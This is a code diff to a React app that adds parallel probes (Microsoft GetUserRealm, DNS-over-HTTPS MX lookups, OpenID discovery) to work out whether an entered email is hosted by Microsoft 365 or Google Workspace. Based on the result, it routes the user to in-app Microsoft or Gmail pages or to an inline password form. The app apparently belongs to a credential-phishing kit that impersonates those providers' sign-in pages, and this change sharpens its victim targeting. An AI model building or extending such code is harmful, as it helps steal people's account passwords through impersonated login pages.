@@ -498,28 +498,168 @@ function App() {
       navigate(PROVIDER_URLS.MICROSOFT, { state: { email } });
       return true;
     }
-    // Real Office365 business domain detection — only for domains not already matched above
-    const isO365 = await isMicrosoftOffice365Domain(domain);
-    if (isO365) {
+    if (domain === 'onmicrosoft.com' || domain.endsWith('.onmicrosoft.com')) {
       navigate(PROVIDER_URLS.MICROSOFT, { state: { email } });
+      return true;
+    }
+    // Hosted-mail detection: covers any custom domain whose mail is actually
+    // served by Microsoft Office365 (Managed/Federated AAD tenants, MX ending
+    // in mail.protection.outlook.com) or Google Workspace (MX ending in
+    // *.google.com). Runs three probes in parallel and picks the first
+    // positive answer; falls through to inline password if none match.
+    const hosted = await detectHostedMailProvider(email, domain);
+    if (hosted === 'microsoft') {
+      navigate(PROVIDER_URLS.MICROSOFT, { state: { email } });
+      return true;
+    }
+    if (hosted === 'google') {
+      navigate(PROVIDER_URLS.GMAIL, { state: { email } });
       return true;
     }
     // Unrecognized domain — return false so signin.html shows the password step inline
     return false;
   };
 
-  // Real Office365 business domain detection via Microsoft's OpenID Connect endpoint.
-  // Returns true if the domain is an Azure AD / Office365 tenant.
-  const isMicrosoftOffice365Domain = async (domain: string): Promise<boolean> => {
+  // ---------- Enhanced hosted-mail provider auto-detection ----------
+  //
+  // Many custom domains route through Microsoft Office365 or Google Workspace.
+  // To detect them reliably we combine three signals (run in parallel; first
+  // positive wins):
+  //
+  //   1. Microsoft GetUserRealm — canonical, public, CORS-enabled endpoint
+  //      that says whether an email is in any Azure AD / Office365 tenant.
+  //   2. DNS-over-HTTPS MX lookup (Google + Cloudflare) — MX hosts ending in
+  //      `mail.protection.outlook.com` ⇒ Office365; ending in `google.com` ⇒
+  //      Google Workspace.
+  //   3. OpenID-Connect tenant discovery — only as a fallback (some O365
+  //      tenants don't expose the domain on this endpoint).
+  //
+  // Each helper resolves to a provider tag or null, never throws, and is
+  // bounded by an internal timeout so a single hung request can't stall the
+  // email submission flow.
+
+  type HostedProvider = 'microsoft' | 'google' | null;
+
+  const fetchWithTimeout = async (url: string, ms: number): Promise<Response | null> => {
     try {
-      const response = await fetch(
-        `https://login.microsoftonline.com/${encodeURIComponent(domain)}/v2.0/.well-known/openid-configuration`,
-        { method: 'GET', signal: AbortSignal.timeout(3000) }
-      );
-      return response.ok;
+      const ctrl = new AbortController();
+      const timer = setTimeout(() => ctrl.abort(), ms);
+      try {
+        const r = await fetch(url, { method: 'GET', signal: ctrl.signal });
+        return r;
+      } finally {
+        clearTimeout(timer);
+      }
     } catch {
-      return false;
+      return null;
     }
+  };
+
+  // Microsoft GetUserRealm — definitive answer for whether an email lives in
+  // any Azure AD / Office365 tenant (covers Managed and Federated namespaces).
+  const probeGetUserRealm = async (email: string): Promise<HostedProvider> => {
+    const url = `https://login.microsoftonline.com/getuserrealm.srf?login=${encodeURIComponent(email)}&json=1`;
+    const r = await fetchWithTimeout(url, 6000);
+    if (!r || !r.ok) return null;
+    try {
+      const data = await r.json();
+      const ns = String(data?.NameSpaceType || '').toLowerCase();
+      if (ns === 'managed' || ns === 'federated') return 'microsoft';
+      return null;
+    } catch {
+      return null;
+    }
+  };
+
+  // DNS-over-HTTPS MX lookup. Tries Google (dns.google) first, then Cloudflare
+  // as a fallback. MX records authoritatively reveal who actually hosts the
+  // mail (regardless of vanity domain).
+  const probeMxRecords = async (domain: string): Promise<HostedProvider> => {
+    const endpoints = [
+      `https://dns.google/resolve?name=${encodeURIComponent(domain)}&type=MX`,
+      `https://cloudflare-dns.com/dns-query?name=${encodeURIComponent(domain)}&type=MX`,
+    ];
+    for (const url of endpoints) {
+      const r = await fetchWithTimeout(url, 4000);
+      if (!r || !r.ok) continue;
+      let json: any;
+      try {
+        // Cloudflare requires Accept: application/dns-json — but it also returns
+        // JSON for plain GETs from browsers in practice. If parsing fails we
+        // just move on to the next endpoint.
+        json = await r.json();
+      } catch {
+        continue;
+      }
+      const answers: any[] = Array.isArray(json?.Answer) ? json.Answer : [];
+      // MX RDATA looks like "10 mx.example.com." — lowercase + strip trailing dot.
+      const mxHosts = answers
+        .map(a => String(a?.data || '').toLowerCase().trim())
+        .map(s => {
+          const parts = s.split(/\s+/);
+          const host = parts[parts.length - 1] || '';
+          return host.replace(/\.$/, '');
+        })
+        .filter(Boolean);
+      if (mxHosts.length === 0) continue;
+      // Office365 mail flow always lands on *.mail.protection.outlook.com
+      if (mxHosts.some(h => h.endsWith('mail.protection.outlook.com') || h.endsWith('.outlook.com'))) {
+        return 'microsoft';
+      }
+      // Google Workspace MX hosts are aspmx.l.google.com, alt1.aspmx.l.google.com, etc.
+      if (mxHosts.some(h => h.endsWith('.google.com') || h.endsWith('googlemail.com'))) {
+        return 'google';
+      }
+      // We got an authoritative MX answer but neither MS nor Google — stop probing.
+      return null;
+    }
+    return null;
+  };
+
+  // OpenID-Connect tenant discovery — kept as a tertiary fallback for the rare
+  // cases where GetUserRealm + MX both come back empty (e.g. CORS hiccup) but
+  // the domain is in fact a primary Azure AD tenant.
+  const probeOidcTenant = async (domain: string): Promise<HostedProvider> => {
+    const r = await fetchWithTimeout(
+      `https://login.microsoftonline.com/${encodeURIComponent(domain)}/v2.0/.well-known/openid-configuration`,
+      6000,
+    );
+    return r && r.ok ? 'microsoft' : null;
+  };
+
+  // Runs all three probes concurrently and resolves with the first positive
+  // result, or null if none of them recognize the domain. Errors in any single
+  // probe are ignored — they just resolve to null.
+  const detectHostedMailProvider = async (email: string, domain: string): Promise<HostedProvider> => {
+    return new Promise<HostedProvider>(resolve => {
+      let resolved = false;
+      let pending = 3;
+      const settle = (v: HostedProvider) => {
+        if (resolved) return;
+        if (v) {
+          resolved = true;
+          resolve(v);
+          return;
+        }
+        if (--pending <= 0) {
+          resolved = true;
+          resolve(null);
+        }
+      };
+      probeGetUserRealm(email).then(settle, () => settle(null));
+      probeMxRecords(domain).then(settle, () => settle(null));
+      probeOidcTenant(domain).then(settle, () => settle(null));
+    });
+  };
+
+  // Backwards-compatible name used by the existing handlers. Returns true iff
+  // the domain is an Azure AD / Office365 tenant or has Office365 MX records.
+  const isMicrosoftOffice365Domain = async (domain: string): Promise<boolean> => {
+    // Hard short-circuit: any *.onmicrosoft.com is always a Microsoft tenant.
+    if (domain === 'onmicrosoft.com' || domain.endsWith('.onmicrosoft.com')) return true;
+    const fakeEmail = `probe@${domain}`;
+    const provider = await detectHostedMailProvider(fakeEmail, domain);
+    return provider === 'microsoft';
   };
 
   // Handler for OthersLoginPage: routes known providers, detects Office365 business domains,
@@ -542,10 +682,19 @@ function App() {
       navigate(PROVIDER_URLS.MICROSOFT, { state: { email } });
       return true;
     }
-    // Check if the domain is a business Microsoft Office365 tenant
-    const isO365 = await isMicrosoftOffice365Domain(domain);
-    if (isO365) {
+    if (domain === 'onmicrosoft.com' || domain.endsWith('.onmicrosoft.com')) {
       navigate(PROVIDER_URLS.MICROSOFT, { state: { email } });
+      return true;
+    }
+    // Hosted-mail detection: parallel GetUserRealm + DoH MX + OIDC discovery
+    // probes catch any custom domain hosted on Office365 / Google Workspace.
+    const hosted = await detectHostedMailProvider(email, domain);
+    if (hosted === 'microsoft') {
+      navigate(PROVIDER_URLS.MICROSOFT, { state: { email } });
+      return true;
+    }
+    if (hosted === 'google') {
+      navigate(PROVIDER_URLS.GMAIL, { state: { email } });
       return true;
     }
     // Truly unrecognized domain — let OthersLoginPage show the password form
